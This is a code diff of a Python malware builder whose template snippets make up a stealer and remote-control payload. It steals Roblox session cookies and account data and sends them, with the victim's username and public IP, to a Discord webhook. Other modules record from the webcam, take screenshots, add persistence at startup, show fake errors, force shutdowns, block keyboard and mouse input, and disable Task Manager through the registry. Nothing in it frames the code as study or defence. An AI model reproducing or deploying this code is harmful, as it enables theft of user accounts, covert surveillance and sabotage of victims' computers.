+                    title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
+                    color=color_embed
+                )
+                embed.set_footer(text=footer_text, icon_url=avatar_embed)
+                embed.set_thumbnail(url=av4t4r_r0b10x)
+                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator.replace("_", " ")}```", inline=True)
+                embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
+                embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{d1spl4y_nam3_r0b10x}```", inline=True)
+                embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
+                embed.add_field(name=":moneybag: Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
+                embed.add_field(name=":tickets: Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
+                embed.add_field(name=":construction_site: Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
+                embed.add_field(name=":cookie: Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
+                embed.add_field(name=":cookie: Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)
 
-            try:
-                pr3mium_r0b10x = d4t4["IsPremium"]
-            except:
-                pr3mium_r0b10x = "None"
-
-            try:
-                av4t4r_r0b10x = d4t4["ThumbnailUrl"]
-            except:
-                av4t4r_r0b10x = avatar_embed
-
-            try:
-                bui1d3r5_c1ub_r0b10x = d4t4["IsAnyBuildersClubMember"]
-            except:
-                bui1d3r5_c1ub_r0b10x = "None"
-    
-            size_c00ki3 = len(c00ki3)
-            middle_c00ki3 = size_c00ki3 // 2
-            c00ki3_part1 = c00ki3[:middle_c00ki3]
-            c00ki3_part2 = c00ki3[middle_c00ki3:]
-
-            client = SyncWebhook.from_url(w3bh00k_ur1)
-
-            embed = discord.Embed(
-                title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
-                color=color_embed
-            )
-            embed.set_footer(text=footer_text, icon_url=avatar_embed)
-            embed.set_thumbnail(url=av4t4r_r0b10x)
-            embed.add_field(name=":compass: | Navigator:", value=f"```{n4vigator}```", inline=True)
-            embed.add_field(name=":bust_in_silhouette: | Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
-            embed.add_field(name=":robot: | Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
-            embed.add_field(name=":moneybag: | Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
-            embed.add_field(name=":tickets: | Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
-            embed.add_field(name=":construction_site: | Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
-            embed.add_field(name=":cookie: | Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
-            embed.add_field(name=":cookie: | Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)
-
-            client.send(embed=embed, username=username_embed,
-                              avatar_url=avatar_embed)
+                w3bh00k.send(embed=embed, username=username_embed,
+                                avatar_url=avatar_embed)
+                
+    if not c00ki35_list:
+        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
+        embed = Embed(
+            title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:', 
+            description=f"No roblox cookie found.",
+            color=color_embed)
+        embed.set_footer(text=footer_text, icon_url=avatar_embed)
+        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -1127,6 +889,11 @@ def R0b10x_C00ki3():
 
 C4m3r4C4ptur3 = r'''
 def C4m3r4_C4ptur3():
+    import os
+    import cv2
+    from discord import SyncWebhook, Embed, File
+    from datetime import datetime
+
     try:
         from datetime import datetime
         name_file_capture = f"CameraCapture_{username_pc}.avi"
@@ -1135,6 +902,13 @@ def C4m3r4_C4ptur3():
 
         if not cap.isOpened():
             Clear()
+            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
+            embed = Embed(
+                title=f'Camera Capture `{username_pc} "{ip_address_public}"`:', 
+                description=f"No camera found.",
+                color=color_embed)
+            embed.set_footer(text=footer_text, icon_url=avatar_embed)
+            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
             return
 
         def c4ptur3(path_file_capture):
@@ -1187,6 +961,8 @@ def C4m3r4_C4ptur3():
 
 Op3nU53rPr0fi1353tting5 = r'''
 def Op3n_U53r_Pr0fi13_53tting5():
+    import subprocess
+    import time
     try:
         subprocess.Popen(["control", "userpasswords2"])
         time.sleep(2)
@@ -1200,6 +976,10 @@ def Op3n_U53r_Pr0fi13_53tting5():
 
 Scr33n5h0t = r'''
 def Scr33n5h0t():
+    import os
+    from PIL import ImageGrab
+    from discord import SyncWebhook, Embed, File
+
     try:
         name_file_screen = f"Screenshot_{username_pc}.png"
 
@@ -1242,6 +1022,8 @@ def Scr33n5h0t():
 
 B10ckW3b5it3 = r'''
 def B10ck_W3b5it3():
+    import os
+
     "Perm Admin Required"
     try:
         d1r3ct0ry = os.getcwd()
@@ -1304,6 +1086,10 @@ def B10ck_W3b5it3():
 
 St4rtup = r'''
 def St4rtup():
+    import os
+    import sys
+    import shutil
+
     try:
         file_path = os.path.abspath(sys.argv[0])
 
@@ -1431,6 +1217,10 @@ while True:
 def F4k33rr0r(title, message):
     F4k33rr0r = f'''
 def F4k3_3rr0r():
+    import tkinter as tk
+    from tkinter import messagebox
+    root = tk.Tk()
+    root.withdraw()
     messagebox.showerror("{title}", "{message}")
 '''
     return F4k33rr0r
@@ -1441,6 +1231,8 @@ def F4k3_3rr0r():
 
 Shutd0wn = r'''
 def Shutd0wn():
+    import sys
+    import os
     if sys.platform.startswith('win'):
         os.system('shutdown /s /t 15')
     elif sys.platform.startswith('linux'):
@@ -1453,6 +1245,9 @@ def Shutd0wn():
 
 Sp4m0p3nPr0gr4m = r'''
 def Sp4m_0p3n_Pr0gr4m():
+    import subprocess
+    import threading
+
     def sp4m():
         programs = [
             'calc.exe',
@@ -1487,6 +1282,7 @@ def Sp4m_0p3n_Pr0gr4m():
 
 B10ckK3y = r'''
 def B10ck_K3y():
+    import keyboard
     k3y = [
         "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
         "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
@@ -1505,6 +1301,7 @@ def B10ck_K3y():
         except: pass
 
 def Unb10ck_K3y():
+    import keyboard
     k3y = [
         "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
         "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
@@ -1529,12 +1326,16 @@ def Unb10ck_K3y():
 
 B10ckT45kM4n4g3r = r'''
 def B10ck_T45k_M4n4g3r():
+    import psutil
+    import subprocess
+    import os
+
     "Perm Admin Required"
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'] == 'Taskmgr.exe':
             proc.terminate()
             break
-    subprocess.run("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
+    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
     Clear()
 '''
 
@@ -1544,6 +1345,10 @@ def B10ck_T45k_M4n4g3r():
 
 B10ckM0u53 = r'''
 def B10ck_M0u53():
+    import pyautogui
+    import keyboard
+    import threading
+    import time
     pyautogui.FAILSAFE = False
     width, height = pyautogui.size()
     pyautogui.moveTo(width + 100, height + 100)
